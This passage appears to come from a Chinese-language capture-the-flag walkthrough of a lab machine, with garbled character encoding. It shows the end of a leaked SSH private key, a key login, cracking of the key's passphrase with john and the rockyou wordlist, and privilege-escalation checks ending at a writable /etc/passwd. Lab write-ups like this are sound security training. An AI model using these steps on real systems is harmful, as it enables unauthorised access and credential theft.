class="line">&gt;b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">&gt;HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">&gt;9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">&gt;zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">&gt;rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">&gt;tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">&gt;94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">&gt;VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">&gt;Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">&gt;hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">&gt;Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">&gt;IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">&gt;MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">&gt;62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">&gt;Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">&gt;p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">&gt;pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">&gt;KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">&gt;i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">&gt;4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">&gt;8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">&gt;-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></blockquote><h3 id="11-æ‰‹æ¡å…¬ç§é’¥å°è¯•ç™»é™†"><a href="#11-æ‰‹æ¡å…¬ç§é’¥å°è¯•ç™»é™†" class="headerlink" title="11.æ‰‹æ¡å…¬ç§é’¥å°è¯•ç™»é™†"></a>11.æ‰‹æ¡å…¬ç§é’¥å°è¯•ç™»é™†</h3><p>æ¸…ç‚¹ä¸€ä¸‹ï¼š</p><p>æœåŠ¡å™¨æ”¯æŒå…¬é’¥çš„è®¤è¯æ–¹å¼â€“ç”¨æˆ·çš„ç›®å½•ä¸‹å­˜åœ¨å…¬é’¥â€“æœåŠ¡å™¨å…è®¸ç”¨æˆ·mowreeä½¿ç”¨å…¬é’¥ç™»é™†â€“æ‹¿å–åˆ°äº†ç§é’¥â€“æ‹¥æœ‰ç§é’¥çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨ç§é’¥å°è¯•ç™»é™†æœåŠ¡å™¨â€“ä¸éœ€è¦è´¦å·å¯†ç â€“åˆ©ç”¨å…¬é’¥è¯æ˜èº«ä»½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208231311174.png" alt="image-20211208231311174"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208231920190.png" alt="image-20211208231920190"></p><p>ä½¿ç”¨ç§é’¥sshç™»é™†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -i id_rsa </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208232318351.png" alt="image-20211208232318351"></p><p>å†é‡å¯†ç ..æ²¡å®Œæ²¡äº†..</p><h3 id="12-çˆ†ç ´ç‹‚äººçº¦ç¿°"><a href="#12-çˆ†ç ´ç‹‚äººçº¦ç¿°" class="headerlink" title="12.çˆ†ç ´ç‹‚äººçº¦ç¿°"></a>12.çˆ†ç ´ç‹‚äººçº¦ç¿°</h3><p>éœ¸ç‹ç¡¬ä¸Šå¼“â€“&gt;çˆ†ç ´ğŸ’£â€“&gt;é€‰æ‹©ä¸€æœ¬è¶³å¤Ÿå¼ºå¤§çš„å­—å…¸ğŸ“–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz . </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou.txt.gz</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208232910798.png" alt="image-20211208232910798"></p><p>ä½¿ç”¨johnå‰ï¼Œéœ€å°†ç§é’¥è½¬æ¢ä¸ºè¯¥å·¥å…·å¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/john</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh2john.py ~/id_rsa &gt; ~/hash</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208233910653.png" alt="image-20211208233910653"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208234313571.png" alt="image-20211208234313571"></p><p>çˆ†ç ´ç»“æœå¾—åˆ°çš„å¯†ç ä¸ºï¼šunicorn</p><p>èƒ¸æœ‰æˆç«¹çš„è¿›è¡Œç™»é™†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -i id_rsa </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208234716317.png" alt="image-20211208234716317"></p><p>ç»ˆäºçªç ´äº†è¾¹ç•Œ è·å–åˆ°äº†ç¬¬ä¸€ä¸ªflag 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p><p>å¦å¤–ä¸€ä¸ªflagåº”è¯¥æ˜¯éœ€è¦rootç”¨æˆ·æ‰èƒ½æ‹¿åˆ°çš„</p><h3 id="13-ææƒå†²é”‹ğŸ›"><a href="#13-ææƒå†²é”‹ğŸ›" class="headerlink" title="13.ææƒå†²é”‹ğŸ›"></a>13.ææƒå†²é”‹ğŸ›</h3><p>å°è¯•ææƒ</p><h4 id="1-æŸ¥çœ‹å½“å‰æœ‰æ— è®¡åˆ’ä»»åŠ¡"><a href="#1-æŸ¥çœ‹å½“å‰æœ‰æ— è®¡åˆ’ä»»åŠ¡" class="headerlink" title="1)æŸ¥çœ‹å½“å‰æœ‰æ— è®¡åˆ’ä»»åŠ¡"></a>1)æŸ¥çœ‹å½“å‰æœ‰æ— è®¡åˆ’ä»»åŠ¡</h4><p>åˆ©ç”¨è„šæœ¬å°±â€¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l    </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208235115298.png" alt="image-20211208235115298"></p><p>å¹¶æ²¡æœ‰ğŸ˜–</p><h4 id="2-æŸ¥çœ‹sudoæƒé™é…ç½®æ–¹é¢æœ‰æ— ç¼ºé™·"><a href="#2-æŸ¥çœ‹sudoæƒé™é…ç½®æ–¹é¢æœ‰æ— ç¼ºé™·" class="headerlink" title="2)æŸ¥çœ‹sudoæƒé™é…ç½®æ–¹é¢æœ‰æ— ç¼ºé™·"></a>2)æŸ¥çœ‹sudoæƒé™é…ç½®æ–¹é¢æœ‰æ— ç¼ºé™·</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l       </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208235258827.png" alt="image-20211208235258827"></p><p>å¹¶æ²¡æœ‰ğŸ˜–</p><h4 id="3-æŸ¥çœ‹å†…æ ¸æ˜¯å¦å­˜åœ¨æ¼æ´"><a href="#3-æŸ¥çœ‹å†…æ ¸æ˜¯å¦å­˜åœ¨æ¼æ´" class="headerlink" title="3)æŸ¥çœ‹å†…æ ¸æ˜¯å¦å­˜åœ¨æ¼æ´"></a>3)æŸ¥çœ‹å†…æ ¸æ˜¯å¦å­˜åœ¨æ¼æ´</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a      </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 4.19 </span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235652875.png" alt="image-20211208235652875"></p><p>å‡ ç•ªå°è¯•å éƒ½å¤±è´¥äº†â€¦..è£‚å¼€â€¦â€¦ğŸ˜­</p><h4 id="4-åˆ©ç”¨find-suid"><a href="#4-åˆ©ç”¨find-suid" class="headerlink" title="4)åˆ©ç”¨find suid"></a>4)åˆ©ç”¨find suid</h4><p>å¯»æ‰¾è¿™å°é¶æœºä¸Šçš„å“ªäº›ç¨‹åº&#x2F;å¯æ‰§è¡Œæ–‡ä»¶æ˜¯å…·æœ‰suidæƒé™ä¸”å±ä¸»æ˜¯root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br><span class="line">#4000å³ä¸ºsuidæƒé™</span><br><span class="line">#å› ä¸ºæ˜¯ä»/æ ¹ç›®å½•æœç´¢çš„æ‰€æœ‰å³æœç´¢æ•´å°é¶æœºä¸Šçš„ç¨‹åº å¯èƒ½å› æƒé™ä¸è¶³ä¼šå­˜åœ¨æŠ¥é”™ ä¸ºäº†æ–¹ä¾¿çœ‹åˆ°æˆåŠŸä¿¡æ¯ å°†é”™è¯¯ä¿¡æ¯å®šå‘åˆ°/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209000653290.png" alt="image-20211209000653290"></p><p>ç»“æœå¾ˆé—æ†¾è¿™äº›å¯æ‰§è¡Œæ–‡ä»¶éƒ½æ˜¯ç³»ç»Ÿé»˜è®¤çš„ å³æ˜¯å®‰å…¨çš„ æ²¡èƒ½å¤Ÿæ‰¾åˆ°çªç ´çš„ç‚¹</p><h4 id="5-åˆ©ç”¨find-sgid"><a href="#5-åˆ©ç”¨find-sgid" class="headerlink" title="5)åˆ©ç”¨find sgid"></a>5)åˆ©ç”¨find sgid</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /2000 2&gt;/dev/null</span><br><span class="line">#2000å³ä¸ºsgidæƒé™</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209001212656.png" alt="image-20211209001212656"></p><p>ä¾ç„¶æ˜¯é»˜è®¤çš„..å¾ˆå®‰å…¨..</p><h4 id="6-å¯»æ‰¾ç³»ç»Ÿä¸­å¯å†™çš„æ–‡ä»¶"><a href="#6-å¯»æ‰¾ç³»ç»Ÿä¸­å¯å†™çš„æ–‡ä»¶" class="headerlink" title="6)å¯»æ‰¾ç³»ç»Ÿä¸­å¯å†™çš„æ–‡ä»¶"></a>6)å¯»æ‰¾ç³»ç»Ÿä¸­å¯å†™çš„æ–‡ä»¶</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc</span><br></pre></td></tr></table></figure><blockquote><p>mowree@EvilBoxOne:~$ find &#x2F; -writable 2&gt;&#x2F;dev&#x2F;null | grep -v proc<br>&#x2F;tmp<br>&#x2F;tmp&#x2F;.ICE-unix<br>&#x2F;tmp&#x2F;.X11-unix<br>&#x2F;tmp&#x2F;.Test-unix<br>&#x2F;tmp&#x2F;.font-unix<br>&#x2F;tmp&#x2F;.XIM-unix<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.null<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.remove<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.replace<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.load<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.access<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#101;&#114;&#118;&#x69;&#99;&#x65;">&#x75;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#101;&#114;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;session-14.scope&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;apache2.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-udevd.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-disk-by\x2duuid-635c225b\x2d1f26\x2d4d4e\x2d912a\x2d87db360ddbb1.swap&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;cron.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;sys-kernel-debug.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-journald.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;ssh.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-mqueue.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;rsyslog.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;<a href="mailto:&#x69;&#102;&#117;&#x70;&#64;&#x65;&#110;&#x70;&#x30;&#115;&#51;&#46;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#x65;">&#x69;&#102;&#117;&#x70;&#64;&#x65;&#110;&#x70;&#x30;&#115;&#51;&#46;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-hugepages.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dbus.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-timesyncd.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;system-getty.slice&#x2F;<a href="mailto:&#x67;&#x65;&#116;&#x74;&#121;&#x40;&#116;&#x74;&#121;&#49;&#x2e;&#x73;&#101;&#x72;&#x76;&#105;&#x63;&#101;">&#x67;&#x65;&#116;&#x74;&#121;&#x40;&#116;&#x74;&#121;&#49;&#x2e;&#x73;&#101;&#x72;&#x76;&#105;&#x63;&#101;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;system-getty.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-logind.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#49;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;">&#117;&#115;&#x65;&#114;&#64;&#49;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;</a><br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#101;">&#117;&#115;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#101;</a>&#x2F;tasks<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#118;&#x69;&#99;&#101;">&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#118;&#x69;&#99;&#101;</a>&#x2F;init.scope<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#99;&#x65;">&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#99;&#x65;</a>&#x2F;init.scope&#x2F;tasks<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#x63;&#101;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#x63;&#101;</a>&#x2F;init.scope&#x2F;notify_on_release<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#49;&#x30;&#x30;&#x30;&#x2e;&#x73;&#101;&#x72;&#118;&#105;&#x63;&#101;">&#x75;&#x73;&#101;&#114;&#x40;&#49;&#x30;&#x30;&#x30;&#x2e;&#x73;&#101;&#x72;&#118;&#105;&#x63;&#101;</a>&#x2F;init.scope&#x2F;cgroup.clone_children<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#x65;&#x72;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#x73;&#101;&#114;&#x76;&#105;&#x63;&#x65;">&#x75;&#x73;&#x65;&#x72;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#x73;&#101;&#114;&#x76;&#105;&#x63;&#x65;</a>&#x2F;cgroup.clone_children<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#x72;&#x40;&#x31;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#x65;">&#117;&#115;&#x65;&#x72;&#x40;&#x31;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#x65;</a><br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#101;&#x72;&#x40;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#99;&#x65;">&#x75;&#115;&#101;&#x72;&#x40;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.threads<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#x65;&#114;&#x40;&#49;&#48;&#48;&#48;&#x2e;&#115;&#101;&#114;&#118;&#x69;&#x63;&#101;">&#x75;&#115;&#x65;&#114;&#x40;&#49;&#48;&#48;&#48;&#x2e;&#115;&#101;&#114;&#118;&#x69;&#x63;&#101;</a>&#x2F;init.scope<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#101;&#x72;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#x63;&#x65;">&#117;&#115;&#101;&#x72;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#x63;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.max.descendants<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.type<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#99;&#101;">&#117;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#99;&#101;</a>&#x2F;init.scope&#x2F;cgroup.threads<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;">&#117;&#115;&#x65;&#114;&#64;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;</a>&#x2F;init.scope&#x2F;cgroup.subtree_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#x72;&#64;&#49;&#48;&#48;&#48;&#46;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;">&#117;&#x73;&#101;&#x72;&#64;&#49;&#48;&#48;&#48;&#46;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.max.depth<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#x72;&#118;&#105;&#x63;&#x65;">&#117;&#115;&#x65;&#114;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#x72;&#118;&#105;&#x63;&#x65;</a>&#x2F;cgroup.subtree_control<br>&#x2F;run&#x2F;dbus&#x2F;system_bus_socket<br>&#x2F;run&#x2F;user&#x2F;1000<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd&#x2F;private<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd&#x2F;notify<br>&#x2F;run&#x2F;shm<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;dev-log<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;syslog<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;socket<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;stdout<br>&#x2F;run&#x2F;systemd&#x2F;private<br>&#x2F;run&#x2F;systemd&#x2F;notify<br>&#x2F;run&#x2F;lock<br>&#x2F;run&#x2F;udev&#x2F;static_node-tags&#x2F;uaccess&#x2F;snd\x2fseq<br>&#x2F;run&#x2F;udev&#x2F;static_node-tags&#x2F;uaccess&#x2F;snd\x2ftimer<br>&#x2F;home&#x2F;mowree<br>&#x2F;home&#x2F;mowree&#x2F;.profile<br>&#x2F;home&#x2F;mowree&#x2F;.bash_history<br>&#x2F;home&#x2F;mowree&#x2F;.ssh<br>&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;id_rsa<br>&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;authorized_keys<br>&#x2F;home&#x2F;mowree&#x2F;.bashrc<br>&#x2F;home&#x2F;mowree&#x2F;.bash_logout<br>&#x2F;home&#x2F;mowree&#x2F;.local<br>&#x2F;home&#x2F;mowree&#x2F;.local&#x2F;share<br>&#x2F;home&#x2F;mowree&#x2F;.local&#x2F;share&#x2F;nano<br><strong>&#x2F;etc&#x2F;passwd</strong>                     